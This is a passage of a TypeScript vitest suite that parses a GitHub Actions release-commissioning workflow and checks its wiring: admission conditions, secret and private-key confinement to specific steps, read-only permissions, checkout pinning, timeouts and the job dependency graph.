import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { parse as parseYaml } from "yaml";
import {
  CLOUD_CASE_SEQUENCE, MAX_JOB_MINUTES, PROTECTED_JOBS, REHEARSAL_JOB_ID, REHEARSAL_JOB_NAME,
  REQUIRED_WITNESS_PUBLICATIONS, WITNESS_JOB_ID, WITNESS_JOB_NAME, WITNESS_MODES,
  evidenceFileName, formatChallengeArtifactName,
} from "../../scripts/staging-ops/policy-commissioning.mjs";

/**
 * AIO-1124 — structural guard over `.github/workflows/release-policy-commissioning.yml`.
 *
 * WHAT THIS GUARDS, AND WHY IT IS PARSED RATHER THAN GREPPED. The commissioning workflow is the one
 * place in this repository where the normal AND emergency release App private keys are both in
 * scope of the same file. Everything that keeps that safe is WIRING — which job may see which
 * secret, which STEPS within a job may see it, which jobs park for a human, what gets checked out,
 * what gets executed, what gets uploaded — and wiring is exactly the class of thing a text search
 * reports on confidently and wrongly. `permissions: { checks: write }` as a flow mapping,
 * `secrets: inherit` on a reusable-workflow call, a second `env:` block further down the same job:
 * each is valid YAML that no anchored regex here would have caught. So this reads the parsed
 * document, and each sweep is proven non-vacuous against a counterfeit fixture below rather than by
 * inspection.
 *
 * WHAT THE F1 TRANSPORT ADDED TO THIS FILE'S JOB. The actor jobs are now FIVE FIXED STEPS PER CASE,
 * because only an official Actions step can upload the challenge artifact the local witness reads.
 * That makes two new things guardable and worth guarding: the CASE SEQUENCE (every closed case,
 * exactly once, its five stages in order — an omitted, duplicated or reordered mutation stage is a
 * red build) and the KEY CONFINEMENT (the private key reaches only the steps that actually mutate,
 * not every step of the job).
 *
 * SCOPE LIMIT, STATED. This proves the workflow's SHAPE. It cannot prove that
 * `staging-release` / `staging-emergency` actually require a reviewer, that `prevent_self_review` is
 * on, or that the App IDs behind those secrets are distinct — those are provider settings and
 * measured evidence (PC-04, PC-06), not file contents, and nothing green here claims them.
 *
 * PC-05 (the actor matrix itself) is deliberately absent: it lives in the runner's suite, because a
 * workflow file cannot evidence a provider outcome.
 */

const ROOT = join(__dirname, "..", "..");
const FILE = ".github/workflows/release-policy-commissioning.yml";
const raw = readFileSync(join(ROOT, FILE), "utf8");

type Step = {
  uses?: string;
  with?: Record<string, unknown>;
  run?: string;
  env?: Record<string, string>;
  if?: string;
  id?: string;
  name?: string;
};
type Job = {
  name?: string;
  if?: string;
  needs?: string | string[];
  environment?: unknown;
  permissions?: unknown;
  secrets?: unknown;
  env?: Record<string, string>;
  steps?: Step[];
};
type Workflow = {
  on?: Record<string, unknown>;
  permissions?: unknown;
  concurrency?: Record<string, unknown>;
  env?: unknown;
  jobs?: Record<string, Job>;
};

const workflow = parseYaml(raw) as Workflow;
const jobs = workflow.jobs ?? {};
const job = (id: string): Job => {
  const j = jobs[id];
  if (!j) throw new Error(`job ${id} is missing from ${FILE}`);
  return j;
};

const EVIDENCE_DIR = "${{ runner.temp }}/policy-commissioning";
const CHALLENGE_DIR = `${EVIDENCE_DIR}/challenges`;
const RUNNER = "node scripts/staging-ops/policy-commissioning.mjs";
const NPM_INSTALL = "npm ci --ignore-scripts";

/**
 * The run ID and attempt as the WORKFLOW spells them. Feeding these expressions through the runner's
 * own `evidenceFileName` and `challengeArtifactName` is what makes this a single-source check: every
 * upload path is compared with the function that derives it, so the two cannot drift into an
 * `if-no-files-found: error` upload of a file that was never written. A second hand-copied list here
 * would just be the same mismatch with a test that agreed with it.
 */
const RUN_EXPR = "${{ github.run_id }}";
const ATTEMPT_EXPR = "${{ github.run_attempt }}";
const evidencePath = (key: string) => `${EVIDENCE_DIR}/${evidenceFileName(RUN_EXPR, ATTEMPT_EXPR, key)}`;
const runnerCommand = (phase: string) =>
  `${RUNNER} ${phase} --run-id "$GITHUB_RUN_ID" --attempt "$GITHUB_RUN_ATTEMPT" --evidence-dir "$RUNNER_TEMP/policy-commissioning"`;
const helperCommand = (fn: string, call: string) =>
  `node --input-type=module -e 'import { ${fn} } from "./scripts/staging-ops/policy-commissioning.mjs"; ${call}'`;
const FIXTURE_COMMAND =
  `node --input-type=module -e 'import { runFixtureChecks } from "./scripts/staging-ops/policy-commissioning.mjs"; await runFixtureChecks(process.env);'`;
const caseStageCommand = (stage: string, caseId: string) =>
  helperCommand("runCaseStage", `await runCaseStage({ stage: "${stage}", caseId: "${caseId}" });`);
const challengeName = (role: string, ordinal: number, direction: "pre" | "post") =>
  formatChallengeArtifactName({ runId: RUN_EXPR, attempt: ATTEMPT_EXPR, role, ordinal, direction });

/** The shared NONSECRET identity set the commissioning jobs' entrypoints receive, from `vars.`. */
const SHARED_VARS: Record<string, string> = {
  COMMISSIONING_NORMAL_APP_ID: "${{ vars.COMMISSIONING_NORMAL_APP_ID }}",
  COMMISSIONING_EMERGENCY_APP_ID: "${{ vars.COMMISSIONING_EMERGENCY_APP_ID }}",
  COMMISSIONING_PRODUCER_IDS_JSON: "${{ vars.COMMISSIONING_PRODUCER_IDS_JSON }}",
  COMMISSIONING_REPOSITORY_ID: "${{ vars.COMMISSIONING_REPOSITORY_ID }}",
};
const SHARED_VAR_KEYS = Object.keys(SHARED_VARS);
const MODE_ENV = "COMMISSIONING_MODE";

/** The env key sets each KIND of step may declare. An exact set, never a superset. */
const ENV_SETS = {
  intent: [MODE_ENV, ...SHARED_VAR_KEYS],
  fixture: [MODE_ENV, "COMMISSIONING_EVIDENCE_DIR", "GITHUB_TOKEN", ...SHARED_VAR_KEYS],
  actorMetadata: (role: "normal" | "emergency") => [
    MODE_ENV, "COMMISSIONING_EVIDENCE_DIR", "GITHUB_TOKEN", ...SHARED_VAR_KEYS,
    ...(role === "normal" ? ["RELEASE_APP_ID", "RELEASE_APP_INSTALLATION_ID"] : ["EMERGENCY_APP_ID", "EMERGENCY_APP_INSTALLATION_ID"]),
  ],
  actorMutating: (role: "normal" | "emergency") => [
    ...ENV_SETS.actorMetadata(role),
    role === "normal" ? "RELEASE_APP_PRIVATE_KEY" : "EMERGENCY_APP_PRIVATE_KEY",
  ],
  finalizer: [MODE_ENV, "COMMISSIONING_EVIDENCE_DIR", "GITHUB_TOKEN", ...SHARED_VAR_KEYS],
  transport: [MODE_ENV, "COMMISSIONING_EVIDENCE_DIR", "GITHUB_TOKEN", "COMMISSIONING_REPOSITORY_ID"],
} as const;

const PRIVATE_KEYS = ["RELEASE_APP_PRIVATE_KEY", "EMERGENCY_APP_PRIVATE_KEY"];

/**
 * Everything that is closed per job: its mode, its exact secret allowlist, the exact ordered list of
 * commands it runs, and the env key set each of those commands may declare. A seventh job, an extra
 * secret, one smuggled env key or a reordered case stage must edit this table first.
 */
type JobSpec = { mode: string; secrets: string[]; commands: { run: string; env: readonly string[] }[]; evidenceKey?: string };

const actorCommands = (role: "normal" | "emergency"): { run: string; env: readonly string[] }[] => [
  { run: NPM_INSTALL, env: [] },
  ...(role === "normal"
    // The installation-level positive control, once, before the first case (PC-05).
    ? [{ run: helperCommand("runNormalCheckPublication", "await runNormalCheckPublication();"), env: ENV_SETS.actorMutating(role) }]
    : []),
  ...CLOUD_CASE_SEQUENCE[role].flatMap((caseId: string) => [
    { run: caseStageCommand("prepare", caseId), env: ENV_SETS.actorMetadata(role) },
    // The ONE step per case that mutates, and the ONE that may hold the private key.
    { run: caseStageCommand("await-and-execute", caseId), env: ENV_SETS.actorMutating(role) },
    { run: caseStageCommand("await-and-finalize", caseId), env: ENV_SETS.actorMetadata(role) },
  ]),
  { run: runnerCommand(`${role}-tests`), env: ENV_SETS.finalizer },
];

const JOBS: Record<string, JobSpec> = {
  intent: {
    mode: "commission", secrets: [], evidenceKey: "intent",
    // Credential-free: no App secret and no GITHUB_TOKEN, so the first artifact in the chain is the
    // one nothing could have been forged with.
    commands: [{ run: NPM_INSTALL, env: [] }, { run: runnerCommand("intent"), env: ENV_SETS.intent }],
  },
  fixture: {
    mode: "commission", secrets: [], evidenceKey: "fixture",
    commands: [{ run: NPM_INSTALL, env: [] }, { run: FIXTURE_COMMAND, env: ENV_SETS.fixture }],
  },
  normal: {
    mode: "commission", evidenceKey: "normal",
    secrets: ["RELEASE_APP_ID", "RELEASE_APP_INSTALLATION_ID", "RELEASE_APP_PRIVATE_KEY"],
    commands: actorCommands("normal"),
  },
  emergency: {
    mode: "commission", evidenceKey: "emergency",
    secrets: ["EMERGENCY_APP_ID", "EMERGENCY_APP_INSTALLATION_ID", "EMERGENCY_APP_PRIVATE_KEY"],
    commands: actorCommands("emergency"),
  },
  [WITNESS_JOB_ID]: {
    mode: "policy-witness", secrets: [],
    // No `npm ci`: node built-ins and the pinned upload action only, in the one job whose whole
    // purpose is to move bytes it did not compute.
    commands: [{ run: helperCommand("runWitnessPublisherJob", "await runWitnessPublisherJob(process.env);"), env: ENV_SETS.transport }],
  },
  [REHEARSAL_JOB_ID]: {
    mode: "transport-rehearsal", secrets: [], evidenceKey: "rehearsal",
    commands: [
      { run: NPM_INSTALL, env: [] },
      { run: helperCommand("runRehearsalStage", 'await runRehearsalStage({ stage: "challenge" });'), env: ENV_SETS.transport },
      { run: helperCommand("runRehearsalStage", 'await runRehearsalStage({ stage: "consume" });'), env: ENV_SETS.transport },
    ],
  },
};
const JOB_IDS = Object.keys(JOBS);

const ADMISSION = [
  "github.event_name == 'workflow_dispatch'",
  "github.repository == 'aiosbrain/aios-team-brain'",
  "github.ref == 'refs/heads/staging'",
];

// ---------------------------------------------------------------------------------------------
// Extracted sweeps. Exported so the non-vacuity block can run each one over a counterfeit document
// instead of asserting that the real file happens to be clean — an ∃-shaped guard over one good
// file proves nothing about the next bad one.
// ---------------------------------------------------------------------------------------------

/** Every `secrets.NAME` reachable from a subtree, in any nesting — `env:`, a step's `with:`, an `if:`. */
export function secretRefs(node: unknown): string[] {
  const found = new Set<string>();
  for (const m of JSON.stringify(node ?? null).matchAll(/secrets\.([A-Za-z_][A-Za-z0-9_]*)/g)) {
    found.add(m[1]);
  }
  return [...found].sort();
}

/** Every environment-variable KEY declared anywhere in a subtree (workflow `env:`, job `env:`, step `env:`). */
export function envKeys(node: unknown): string[] {
  const out: string[] = [];
  const walk = (n: unknown) => {
    if (Array.isArray(n)) return n.forEach(walk);
    if (!n || typeof n !== "object") return;
    for (const [k, v] of Object.entries(n as Record<string, unknown>)) {
      if (k === "env" && v && typeof v === "object" && !Array.isArray(v)) out.push(...Object.keys(v));
      walk(v);
    }
  };
  walk(node);
  return out;
}

/**
 * Checkout steps that do NOT pin the immutable dispatch SHA with credentials dropped.
 *
 * Catches three spellings that all mean "run code somebody could have changed after dispatch": a
 * branch NAME, an expression that is not `github.sha`, and a checkout with no `with:` at all (which
 * also leaves `persist-credentials` at its default `true`, parking a usable token in `.git/config`
 * for the rest of the job).
 */
export function looseCheckouts(doc: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(doc.jobs ?? {})) {
    const steps = (j.steps ?? []).filter((s) => typeof s.uses === "string" && s.uses.startsWith("actions/checkout@"));
    if (steps.length === 0) out.push(`${id}: no checkout step`);
    for (const s of steps) {
      const w = s.with ?? {};
      if (w.ref !== "${{ github.sha }}") out.push(`${id}: checkout ref is ${JSON.stringify(w.ref ?? null)}`);
      if (w["persist-credentials"] !== false) out.push(`${id}: checkout keeps credentials`);
    }
  }
  return out;
}

/** Every `run:` in the file, normalised to one line so a folded scalar compares exactly. */
export function runCommands(doc: Workflow): { job: string; run: string }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.run === "string")
      .map((s) => ({ job: id, run: s.run!.replace(/\s+/g, " ").trim() }))
  );
}

/**
 * Every `run:` step with its normalised command AND its declared env, in file order.
 *
 * Per-STEP rather than per-job, because with five steps per case the question that matters is no
 * longer "does this job hold the key" but "which of its steps does" — and an env allowlist checked
 * only at the job level would be satisfied by a job that handed the key to all forty of them.
 */
export function runSteps(doc: Workflow): { job: string; run: string; env: string[]; if?: string }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.run === "string")
      .map((s) => ({ job: id, run: s.run!.replace(/\s+/g, " ").trim(), env: Object.keys(s.env ?? {}), if: s.if }))
  );
}

/**
 * The ENTRYPOINT steps — every `run:` step that is not the dependency install. This is what the
 * per-step env allowlist is asserted against, so a second credentialed step smuggled into a job
 * cannot hide behind the one that was reviewed.
 */
export function entrypointSteps(doc: Workflow): { job: string; step: Step }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.run === "string" && !s.run.trim().startsWith("npm "))
      .map((s) => ({ job: id, step: s }))
  );
}

/** Every `actions/upload-artifact` step, with the job it belongs to. */
export function uploads(doc: Workflow): { job: string; step: Step }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.uses === "string" && s.uses.startsWith("actions/upload-artifact@"))
      .map((s) => ({ job: id, step: s }))
  );
}

// ---------------------------------------------------------------------------------------------

describe("PC-01: fixed targets — manual admission, closed inputs, immutable source", () => {
  it("covers EXACTLY the six declared jobs, so a seventh cannot slip past every sweep below", () => {
    // Every assertion in this file iterates JOB_IDS or `workflow.jobs`. An exact-set equality is what
    // keeps those two the same thing: a new job added without a row in JOBS reddens here first.
    expect(Object.keys(jobs).sort()).toEqual([...JOB_IDS].sort());
  });

  it("is dispatch-only, with exactly two CLOSED inputs and neither of them a target", () => {
    expect(Object.keys(workflow.on ?? {})).toEqual(["workflow_dispatch"]);
    const inputs = (workflow.on?.workflow_dispatch as { inputs?: Record<string, Record<string, unknown>> })?.inputs ?? {};
    // PC-01 forbids a caller supplying a repo, ref, endpoint, script path or resource name. `mode` is
    // a CLOSED choice over three reviewed job sets, and `witness_envelope` is DATA read from the
    // event payload by fixed checked-out code. There is still nowhere to type a target.
    expect(Object.keys(inputs).sort()).toEqual(["mode", "witness_envelope"]);
    expect(inputs.mode.type).toBe("choice");
    expect(inputs.mode.options).toEqual([...WITNESS_MODES]);
    expect(inputs.mode.default).toBe("commission");
    expect(inputs.witness_envelope.type).toBe("string");
    expect(inputs.witness_envelope.default).toBe("");
  });

  it("never interpolates an input, or any event payload, into a command", () => {
    // THE distinction that keeps `witness_envelope` an input rather than an instruction: it is read
    // from `GITHUB_EVENT_PATH` by checked-out code, and no `run:` may template it — or `inputs.mode`,
    // or anything off `github.event` — into a shell.
    for (const { job: id, run } of runCommands(workflow)) {
      expect(run, `job ${id} interpolates an expression into a shell command`).not.toContain("${{");
    }
    expect(raw, "the envelope is never templated into a step").not.toMatch(/\$\{\{[^}]*inputs\.witness_envelope/);
    expect(raw, "no job may read an unvalidated event payload").not.toMatch(/\$\{\{[^}]*github\.event\./);
    // `inputs.mode` appears only where it is allowed to: job admission, the concurrency group, and the
    // runner-side mode env var that re-states the admission independently.
    const modeUses = [...raw.matchAll(/^(.*)\$\{\{ inputs\.mode \}\}/gm)].map((m) => m[1].trim());
    for (const context of modeUses) {
      expect(context, `inputs.mode used in an unexpected position: ${context}`).toMatch(/^(if:|group:|COMMISSIONING_MODE:)/);
    }
  });

  it("EVERY job states the full admission condition AND exactly one mode itself", () => {
    // A `needs:` edge propagates a SKIP but is not admission control. Two of these jobs hold release
    // App keys, so each one pins repository + branch + event + mode on its own line.
    for (const id of JOB_IDS) {
      const condition = job(id).if ?? "";
      for (const clause of ADMISSION) expect(condition, `job ${id} does not pin ${clause}`).toContain(clause);
      expect(condition, `job ${id} does not pin its mode`).toContain(`inputs.mode == '${JOBS[id].mode}'`);
      // A NEGATIVE mode condition is how an unknown or empty mode falls through into commissioning.
      expect(condition, `job ${id} uses a negative mode condition`).not.toMatch(/inputs\.mode\s*!=/);
    }
    // And every mode is claimed by at least one job, so the enum and the file agree.
    expect([...new Set(JOB_IDS.map((id) => JOBS[id].mode))].sort()).toEqual([...WITNESS_MODES].sort());
  });

  it("EVERY job checks out the immutable dispatch SHA with credentials dropped", () => {
    expect(looseCheckouts(workflow)).toEqual([]);
  });

  it("concurrency is isolated per MODE, RUN and ATTEMPT and never cancels a run being evidenced", () => {
    const group = String(workflow.concurrency?.group ?? "");
    // The MODE is in the group because a protected actor job BLOCKS waiting for a witness publisher
    // run: a group that could serialise the publisher behind the source run, or cancel the source
    // run, would deadlock the harness against itself.
    expect(group).toContain("inputs.mode");
    expect(group).toContain("github.run_id");
    expect(group).toContain("github.run_attempt");
    expect(workflow.concurrency?.["cancel-in-progress"]).toBe(false);
  });
});

describe("PC-02: separated execution roles — exact secret allowlists and per-STEP key confinement", () => {
  it("declares read-only default permissions at the workflow level", () => {
    expect(workflow.permissions).toEqual({ contents: "read", actions: "read" });
  });

  it("has NO workflow-level env and NO workflow-level or job-level secret plumbing", () => {
    // A workflow-level `env:` puts a value in scope of every job, which is the one thing this file's
    // whole separation depends on not happening. `secrets: inherit` is the reusable-workflow spelling
    // that hands EVERYTHING to a callee with no `secrets.` text on the line at all.
    expect(workflow.env, "a workflow-level env is in scope of every job").toBeUndefined();
    expect(secretRefs(workflow.env)).toEqual([]);
    expect(raw, "no reusable-workflow secret inheritance").not.toMatch(/secrets:\s*inherit/);
    expect(raw, "no indexed secret access, which the name sweep cannot see").not.toMatch(/secrets\s*\[/);
    for (const id of JOB_IDS) {
      expect(job(id).secrets, `job ${id} must not forward secrets to a reusable workflow`).toBeUndefined();
      expect(job(id).env, `job ${id} must scope env to the step that needs it`).toBeUndefined();
    }
  });

  it("gives each job EXACTLY its allowlisted secrets — no counterpart key, no operator credential", () => {
    for (const [id, spec] of Object.entries(JOBS)) {
      expect(secretRefs(job(id)), `job ${id} secret set`).toEqual([...spec.secrets].sort());
    }
    // Spelled out again against the raw text, because the assertion that matters most is a negative
    // one and an over-clever helper is exactly how a negative assertion goes vacuous.
    expect(JSON.stringify(job("normal"))).not.toContain("secrets.EMERGENCY_");
    expect(JSON.stringify(job("emergency"))).not.toContain("secrets.RELEASE_APP_");
    expect(secretRefs(job("intent")), "the first artifact in the chain is credential-free").toEqual([]);
    expect(secretRefs(job("fixture")), "a job that can mint a check holds no App key").toEqual([]);
    // The two TRANSPORT jobs hold no secret at all: the publisher moves bytes it did not compute, and
    // the rehearsal is inert by construction.
    expect(secretRefs(job(WITNESS_JOB_ID)), "the witness publisher holds no secret").toEqual([]);
    expect(secretRefs(job(REHEARSAL_JOB_ID)), "the transport rehearsal holds no secret").toEqual([]);
  });

  it("confines each private KEY to the steps that actually mutate", () => {
    // The F1 correction's key-confinement half. `prepare` measures preconditions and `await-and-
    // finalize` reads a witness response; neither needs to mint a credential, so neither receives the
    // key. Only the ONE step per case that issues the mutation does — plus the normal role's
    // installation-level positive control, which is its own reviewed write.
    for (const role of ["normal", "emergency"] as const) {
      const key = role === "normal" ? "RELEASE_APP_PRIVATE_KEY" : "EMERGENCY_APP_PRIVATE_KEY";
      const holders = (job(role).steps ?? []).filter((step) => Object.keys(step.env ?? {}).includes(key));
      const expectedHolders = CLOUD_CASE_SEQUENCE[role].length + (role === "normal" ? 1 : 0);
      expect(holders.length, `${role} key-holding steps`).toBe(expectedHolders);
      for (const step of holders) {
        expect(step.run!.replace(/\s+/g, " "), `${role} key holder`).toMatch(/await-and-execute|runNormalCheckPublication/);
      }
    }
    // And no other job references a private key under any spelling.
    for (const id of JOB_IDS.filter((i) => i !== "normal" && i !== "emergency")) {
      for (const key of PRIVATE_KEYS) expect(JSON.stringify(job(id)), `job ${id} must not see ${key}`).not.toContain(key);
    }
  });

  it("withholds a GITHUB_TOKEN from the intent job, and gives it to every other job", () => {
    // NOT "only the fixture gets a token". The actor jobs need one for `actions: read` /
    // `contents: read` metadata (the setup readback, commit-graph verification and artifact
    // download); it is read-only and is never an actor in the matrix — the actor is the installation
    // token minted from their secrets. What must stay credential-free is `intent`, whose artifact
    // everything downstream is checked against.
    const holders = JOB_IDS.filter((id) => envKeys(job(id)).includes("GITHUB_TOKEN")).sort();
    expect(holders).toEqual([...JOB_IDS.filter((id) => id !== "intent")].sort());
    for (const id of holders) {
      expect(job(id).steps?.some((s) => s.env?.GITHUB_TOKEN === "${{ github.token }}"), `job ${id} token source`).toBe(true);
    }
    // `github.token` is the same credential under its expression name; it must not reach `intent`
    // under either spelling.
    expect(envKeys(job("intent"))).not.toContain("GITHUB_TOKEN");
    expect(JSON.stringify(job("intent")), "the intent job must not reference github.token").not.toContain("github.token");
  });

  it("grants `checks: write` to the fixture job ONLY, and grants nothing else write anywhere", () => {
    // This is what keeps the actor jobs' workflow tokens read-only: they can read run, commit and
    // artifact metadata and nothing more, so holding one alongside a release key adds no write reach.
    expect(job("fixture").permissions).toEqual({ contents: "read", actions: "read", checks: "write" });
    for (const id of JOB_IDS.filter((i) => i !== "fixture")) {
      expect(job(id).permissions, `job ${id} permissions`).toEqual({ contents: "read", actions: "read" });
    }
    expect(raw, "the only write grant is the fixture's checks: write").not.toMatch(/\bwrite-all\b/);
  });

  it("gives every entrypoint step EXACTLY the env keys its row allows, and no role discriminator", () => {
    // An exact key set per STEP, not a superset check and not per job: a smuggled provider token, a
    // second App ID or a revived discriminator all show up as an inequality here rather than as prose
    // nobody re-reads.
    const observed = runSteps(workflow).filter((step) => !step.run.startsWith("npm "));
    const expected = JOB_IDS.flatMap((id) => JOBS[id].commands.filter((c) => c.run !== NPM_INSTALL).map((c) => ({ job: id, run: c.run, env: [...c.env].sort() })));
    expect(observed.map(({ job: id, run }) => ({ job: id, run }))).toEqual(expected.map(({ job: id, run }) => ({ job: id, run })));
    for (const [index, step] of observed.entries()) {
      expect([...step.env].sort(), `${step.job} step ${index}: ${step.run.slice(0, 70)}`).toEqual(expected[index].env);
    }
    // `COMMISSIONING_ROLE` was the provisional discriminator that let the fixture ride the `intent`
    // phase. Both are gone: every job has its own reviewed entrypoint, so nothing needs telling apart.
    expect(raw, "the COMMISSIONING_ROLE discriminator is retired").not.toContain("COMMISSIONING_ROLE");
  });

  it("passes the shared NONSECRET identity set to every COMMISSIONING step, always from `vars.`", () => {
    // PC-04 needs each protected job to refuse an identical normal/emergency App ID, which it cannot
    // do against an identity it was never told. Numeric App/repository/producer IDs are public
    // metadata; routing them as `vars.` values is what keeps the counterpart PRIVATE KEY in the other
    // environment. The two TRANSPORT jobs are outside this: they hold no App identity at all, and
    // requiring one would make the inert rehearsal depend on a provisioned release App.
    for (const { job: id, step } of entrypointSteps(workflow)) {
      if (JOBS[id].mode !== "commission") continue;
      for (const [key, source] of Object.entries(SHARED_VARS)) {
        expect(step.env?.[key], `job ${id} must read ${key} from a repository variable`).toBe(source);
      }
    }
    expect(raw, "an App private key is never a repository variable").not.toMatch(/vars\.[A-Za-z_]*PRIVATE_KEY/);
  });

  it("re-states the mode to the runner in every step, so job admission is not the only gate", () => {
    for (const { job: id, step } of entrypointSteps(workflow)) {
      expect(step.env?.[MODE_ENV], `job ${id} step must carry its mode to the runner`).toBe("${{ inputs.mode }}");
    }
  });
});

describe("PC-03: ordered bootstrap — dependencies and protected environments", () => {
  const needs = (id: string): string[] => {
    const n = job(id).needs;
    return Array.isArray(n) ? [...n].sort() : n ? [n] : [];
  };

  it("runs the credential-free intent FIRST, depending on nothing", () => {
    expect(needs("intent")).toEqual([]);
    expect(job("intent").environment, "the intent job must not park for approval").toBeUndefined();
  });

  it("wires the exact dependency graph the actor matrix requires", () => {
    expect(needs("fixture")).toEqual(["intent"]);
    // `fixture` is a real dependency of `normal`: the accepted case needs every synthetic check
    // already green, and the missing/red/wrong-producer denials need them in a known state first.
    expect(needs("normal")).toEqual(["fixture", "intent"]);
    // `emergency` deliberately does NOT wait on the fixture — its case is "checks ABSENT accepted".
    expect(needs("emergency")).toEqual(["intent"]);
    // The two transport jobs run in their OWN source runs and depend on nothing in this one.
    expect(needs(WITNESS_JOB_ID)).toEqual([]);
    expect(needs(REHEARSAL_JOB_ID)).toEqual([]);
  });

  it("parks both actor jobs in their own protected environment, and nothing else", () => {
    expect(job("normal").environment).toBe("staging-release");
    expect(job("emergency").environment).toBe("staging-emergency");
    const protectedJobs = JOB_IDS.filter((id) => job(id).environment !== undefined);
    expect(protectedJobs.sort()).toEqual(["emergency", "normal"]);
    // The transport jobs are explicitly NOT protected: the publisher must be able to run while the
    // actor job that is waiting for it holds an approval, and the rehearsal exists precisely to be
    // runnable BEFORE any approval exists.
    expect(job(WITNESS_JOB_ID).environment).toBeUndefined();
    expect(job(REHEARSAL_JOB_ID).environment).toBeUndefined();
  });

  /**
   * Whether a job transitively depends on the fixture — and therefore on the LOCAL setup phase the
   * fixture waits for. This is the fact `PROTECTED_JOBS[].atSetup` in the runner encodes, and the
   * two must agree or the runner's pre-approval assertion is wrong about its own workflow.
   */
  const dependsOnFixture = (id: string, seen = new Set<string>()): boolean => {
    if (seen.has(id)) return false;
    seen.add(id);
    return needs(id).some((dep) => dep === "fixture" || dependsOnFixture(dep, seen));
  };

  it("the runner's protected-job table names the jobs as the JOBS API will report them", () => {
    // The jobs API returns the DISPLAY name, so this is the string `assertProtectedJobsWaiting`
    // matches on. A rename here with no rename there would make every protected job look absent —
    // and "absent" is a state the runner treats as legal for one of them, so the bug would present
    // as a quietly weaker assertion rather than as an error.
    expect(PROTECTED_JOBS.map((spec: { id: string }) => spec.id).sort()).toEqual(["emergency", "normal"]);
    for (const spec of PROTECTED_JOBS as { id: string; name: string; environment: string }[]) {
      expect(job(spec.id).name, `job ${spec.id} display name`).toBe(spec.name);
      expect(job(spec.id).environment, `job ${spec.id} environment`).toBe(spec.environment);
    }
  });

  it("the runner's at-setup expectation follows this file's real dependency graph", () => {
    for (const spec of PROTECTED_JOBS as { id: string; atSetup: string }[]) {
      // A protected job downstream of the fixture cannot yet exist when setup runs (GitHub does not
      // create a job until its `needs:` are satisfied), so requiring it to be `waiting` would
      // deadlock the harness against its own ordering. One that is not may only be parked.
      expect(spec.atSetup, `job ${spec.id} at-setup expectation`).toBe(
        dependsOnFixture(spec.id) ? "parked-or-uncreated" : "parked",
      );
    }
    // Non-vacuity: the two protected jobs must actually DIFFER on this, or the assertion above
    // would pass for a table that made both expectations the same.
    expect(new Set((PROTECTED_JOBS as { atSetup: string }[]).map((spec) => spec.atSetup)).size).toBe(2);
  });

  it("leaves the fixture UNPROTECTED so it can wait for local setup while the actors are parked", () => {
    // If the fixture were environment-gated it would need its own approval, and the checks the
    // protected jobs are approved to exercise could not exist yet at the moment of approval. Its
    // wait is bounded twice: by the helper's own deadline, and by this job timeout as a backstop.
    expect(job("fixture").environment).toBeUndefined();
    expect(secretRefs(job("fixture"))).toEqual([]);
    expect(typeof (jobs.fixture as unknown as { "timeout-minutes"?: number })["timeout-minutes"]).toBe("number");
  });

  it("bounds every job at or under the CANONICAL 30-minute limit, by exact value (F15)", () => {
    /**
     * `> 0` was the whole assertion, which is why the fixture job carried 45 minutes and both
     * actor jobs carried 90 while the accepted contract says 30. A bound that may exceed the
     * contract is not a bound; it is a second contract. The value comes from the runner's one
     * definition rather than being retyped here.
     */
    expect(MAX_JOB_MINUTES).toBe(30);
    for (const id of JOB_IDS) {
      const timeout = (jobs[id] as unknown as { "timeout-minutes"?: number })["timeout-minutes"];
      expect(typeof timeout, `job ${id} timeout`).toBe("number");
      expect(Number(timeout), `job ${id} timeout`).toBeGreaterThan(0);
      expect(Number(timeout), `job ${id} exceeds the canonical job bound`).toBeLessThanOrEqual(MAX_JOB_MINUTES);
    }
    // The three jobs the review named, at exactly the canonical bound.
    for (const id of ["fixture", "normal", "emergency"]) {
      expect(Number((jobs[id] as unknown as { "timeout-minutes"?: number })["timeout-minutes"]), id).toBe(MAX_JOB_MINUTES);
    }
  });

  it("names the two transport jobs exactly as the runner matches them in the jobs API (F11)", () => {
    /**
     * `/jobs` reports the DISPLAY name, so a rename here would make the runner's lookup find
     * nothing — and "no job found" reads as a refusal rather than as a bug. The rehearsal used to
     * admit itself by COUNTING one non-skipped job, which says nothing about which job that was;
     * it now matches this exact string.
     */
    expect((jobs[WITNESS_JOB_ID] as unknown as { name?: string }).name).toBe(WITNESS_JOB_NAME);
    expect((jobs[REHEARSAL_JOB_ID] as unknown as { name?: string }).name).toBe(REHEARSAL_JOB_NAME);
  });
});

describe("F1: the per-case stage sequence and the witness transport's wiring", () => {
  /** The (case, stage) pairs each actor job runs, in file order. */
  const stagePairs = (role: "normal" | "emergency") =>
    runCommands(workflow)
      .filter((c) => c.job === role)
      .map((c) => /runCaseStage\(\{ stage: "([a-z-]+)", caseId: "([a-z0-9-]+)" \}\)/.exec(c.run))
      .filter((m): m is RegExpExecArray => Boolean(m))
      .map((m) => ({ stage: m[1], caseId: m[2] }));

  it("enumerates EVERY closed case exactly once, with its three runner stages in order", () => {
    for (const role of ["normal", "emergency"] as const) {
      const expected = CLOUD_CASE_SEQUENCE[role].flatMap((caseId: string) =>
        ["prepare", "await-and-execute", "await-and-finalize"].map((stage) => ({ stage, caseId })));
      // An OMITTED, DUPLICATED or REORDERED mutation stage is an inequality here. This is the
      // canonical revision's explicit requirement of this suite, and it is why the expectation is
      // derived from `CLOUD_CASE_SEQUENCE` rather than retyped.
      expect(stagePairs(role), `${role} case stages`).toEqual(expected);
    }
  });

  it("publishes exactly one pre and one post challenge per case, at its derived name and path", () => {
    for (const role of ["normal", "emergency"] as const) {
      const challengeUploads = uploads(workflow)
        .filter((u) => u.job === role && String(u.step.with?.name ?? "").startsWith("commissioning-challenge-"));
      const expected = CLOUD_CASE_SEQUENCE[role].flatMap((_caseId: string, index: number) =>
        (["pre", "post"] as const).map((direction) => challengeName(role, index + 1, direction)));
      expect(challengeUploads.map((u) => String(u.step.with?.name)), `${role} challenge artifacts`).toEqual(expected);
      for (const upload of challengeUploads) {
        const name = String(upload.step.with?.name);
